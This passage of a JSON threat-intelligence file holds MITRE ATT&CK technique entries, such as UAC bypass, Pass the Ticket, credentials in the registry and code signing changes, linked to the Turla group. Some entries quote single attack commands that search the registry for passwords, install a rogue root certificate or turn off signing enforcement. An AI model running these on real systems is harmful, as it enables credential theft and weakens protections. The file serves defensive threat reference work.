        "url": "https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/",
        "description": "Nelson, M. (2016, August 15). \"Fileless\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 sdclt app paths",
        "url": "https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/",
        "description": "Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 sdclt bypass",
        "url": "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/",
        "description": "Nelson, M. (2017, March 17). \"Fileless\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Inside UAC",
        "url": "https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx",
        "description": "Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Fortinet Fareit",
        "url": "https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware",
        "description": "Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Github UACMe",
        "url": "https://github.com/hfiref0x/UACME",
        "description": "UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "administrator",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
    "platform": "windows",
    "tid": "T1548.002",
    "technique": "Bypass User Account Control",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|process-creation|process-metadata|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
    "technique_references": [
      {
        "source_name": "Davidson Windows",
        "url": "http://www.pretentiousname.com/misc/win7_uac_whitelist2.html",
        "description": "Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet How UAC Works",
        "url": "https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works",
        "description": "Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SANS UAC Bypass",
        "url": "http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass",
        "description": "Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN COM Elevation",
        "url": "https://msdn.microsoft.com/en-us/library/ms679687.aspx",
        "description": "Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 Fileless UAC Bypass",
        "url": "https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/",
        "description": "Nelson, M. (2016, August 15). \"Fileless\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 sdclt app paths",
        "url": "https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/",
        "description": "Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 sdclt bypass",
        "url": "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/",
        "description": "Nelson, M. (2017, March 17). \"Fileless\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Inside UAC",
        "url": "https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx",
        "description": "Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Fortinet Fareit",
        "url": "https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware",
        "description": "Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Github UACMe",
        "url": "https://github.com/hfiref0x/UACME",
        "description": "UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "administrator",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926",
    "platform": "windows",
    "tid": "T1550.003",
    "technique": "Pass the Ticket",
    "tactic": "defense-evasion",
    "datasources": "active-directory-credential-request|logon-session-creation|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "mimikatz",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/645.html",
        "description": "none",
        "external_id": "CAPEC-645"
      },
      {
        "source_name": "ADSecurity AD Kerberos Attacks",
        "url": "https://adsecurity.org/?p=556",
        "description": "Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GentilKiwi Pass the Ticket",
        "url": "http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos",
        "description": "Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Campbell 2014",
        "url": "http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf",
        "description": "Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Stealthbits Overpass-the-Hash",
        "url": "https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/",
        "description": "Warren, J. (2019, February 26). How to Detect Overpass-the-Hash Attacks. Retrieved February 4, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "CERT-EU Golden Ticket Protection",
        "url": "https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf",
        "description": "Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926",
    "platform": "windows",
    "tid": "T1550.003",
    "technique": "Pass the Ticket",
    "tactic": "lateral-movement",
    "datasources": "active-directory-credential-request|logon-session-creation|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "mimikatz",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/645.html",
        "description": "none",
        "external_id": "CAPEC-645"
      },
      {
        "source_name": "ADSecurity AD Kerberos Attacks",
        "url": "https://adsecurity.org/?p=556",
        "description": "Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GentilKiwi Pass the Ticket",
        "url": "http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos",
        "description": "Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Campbell 2014",
        "url": "http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf",
        "description": "Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Stealthbits Overpass-the-Hash",
        "url": "https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/",
        "description": "Warren, J. (2019, February 26). How to Detect Overpass-the-Hash Attacks. Retrieved February 4, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "CERT-EU Golden Ticket Protection",
        "url": "https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf",
        "description": "Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc",
    "platform": "windows|iaas|linux|macos|containers",
    "tid": "T1552.001",
    "technique": "Credentials In Files",
    "tactic": "credential-access",
    "datasources": "command-execution|file-access",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/639.html",
        "description": "none",
        "external_id": "CAPEC-639"
      },
      {
        "source_name": "CG 2014",
        "url": "http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html",
        "description": "CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "SRD GPP",
        "url": "http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx",
        "description": "Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Hildegard Malware",
        "url": "https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/",
        "description": "Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes. Retrieved April 5, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Unsecured Docker Daemons",
        "url": "https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/",
        "description": "Chen, J.. (2020, January 29). Attacker's Tactics and Techniques in Unsecured Docker Daemons Revealed. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Specter Ops - Cloud Credential Storage",
        "url": "https://posts.specterops.io/head-in-the-clouds-bd038bb69e48",
        "description": "Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved October 4, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580",
    "platform": "windows",
    "tid": "T1552.002",
    "technique": "Credentials in Registry",
    "tactic": "credential-access",
    "datasources": "command-execution|process-creation|windows-registry-key-access",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "reg",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
    "technique_references": [
      {
        "source_name": "Pentestlab Stored Credentials",
        "url": "https://pentestlab.blog/2017/04/19/stored-credentials/",
        "description": "netbiosX. (2017, April 19). Stored Credentials. Retrieved April 6, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839",
    "platform": "linux|macos|windows",
    "tid": "T1553.004",
    "technique": "Install Root Certificate",
    "tactic": "defense-evasion",
    "datasources": "command-execution|process-creation|windows-registry-key-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "certutil",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/479.html",
        "description": "none",
        "external_id": "CAPEC-479"
      },
      {
        "source_name": "Wikipedia Root Certificate",
        "url": "https://en.wikipedia.org/wiki/Root_certificate",
        "description": "Wikipedia. (2016, December 6). Root certificate. Retrieved February 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Operation Emmental",
        "url": "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf",
        "description": "Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Superfish",
        "url": "https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/",
        "description": "Onuma. (2015, February 24). Superfish: Adware Preinstalled on Lenovo Laptops. Retrieved February 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "SpectorOps Code Signing Dec 2017",
        "url": "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec",
        "description": "Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "objective-see ay mami 2018",
        "url": "https://objective-see.com/blog/blog_0x26.html",
        "description": "Patrick Wardle. (2018, January 11). Ay MaMi. Retrieved March 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sigcheck May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sigcheck",
        "description": "Russinovich, M. et al.. (2017, May 22). Sigcheck. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Tripwire AppUNBlocker",
        "url": "https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/",
        "description": "Smith, T. (2016, October 27). AppUNBlocker: Bypassing AppLocker. Retrieved December 19, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c",
    "platform": "windows|macos",
    "tid": "T1553.006",
    "technique": "Code Signing Policy Modification",
    "tactic": "defense-evasion",
    "datasources": "command-execution|process-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",
    "technique_references": [
      {
        "source_name": "Apple Disable SIP",
        "url": "https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection",
        "description": "Apple. (n.d.). Disabling and Enabling System Integrity Protection. Retrieved April 22, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "F-Secure BlackEnergy 2014",
        "url": "https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163408/BlackEnergy_Quedagh.pdf",
        "description": "F-Secure Labs. (2014). BlackEnergy & Quedagh: The convergence of crimeware and APT attacks. Retrieved March 24, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye HIKIT Rootkit Part 2",
        "url": "https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-2.html",
        "description": "Glyer, C., Kazanciyan, R. (2012, August 22). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 2). Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Unsigned Driver Apr 2017",
        "url": "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/installing-an-unsigned-driver-during-development-and-test",
        "description": "Microsoft. (2017, April 20). Installing an Unsigned Driver during Development and Test. Retrieved April 22, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DSE June 2017",
        "url": "https://docs.microsoft.com/en-us/previous-versions/windows/hardware/design/dn653559(v=vs.85)?redirectedfrom=MSDN",
        "description": "Microsoft. (2017, June 1). Digital Signatures for Kernel Modules on Windows. Retrieved April 22, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft TESTSIGNING Feb 2021",
        "url": "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option",
        "description": "Microsoft. (2021, February 15). Enable Loading of Test Signed Drivers. Retrieved April 22, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Unit42 AcidBox June 2020",
        "url": "https://unit42.paloaltonetworks.com/acidbox-rare-malware/",
        "description": "Reichel, D. and Idrizovic, E. (2020, June 17). AcidBox: Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations. Retrieved March 16, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Turla Driver Loader",
        "url": "https://github.com/hfiref0x/TDL",
        "description": "TDL Project. (2016, February 4). TDL (Turla Driver Loader). Retrieved April 22, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0",
    "platform": "linux|macos|windows",
    "tid": "T1555",
    "technique": "Credentials from Password Stores",
    "tactic": "credential-access",
    "datasources": "command-execution|file-access|os-api-execution|process-access|process-creation",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1555.002",
      "T1555.003",
      "T1555.005"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "mimikatz",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
    "technique_references": [],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e",
    "platform": "windows",
    "tid": "T1557.001",
    "technique": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "tactic": "collection",
    "datasources": "network-traffic-content|network-traffic-flow|service-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 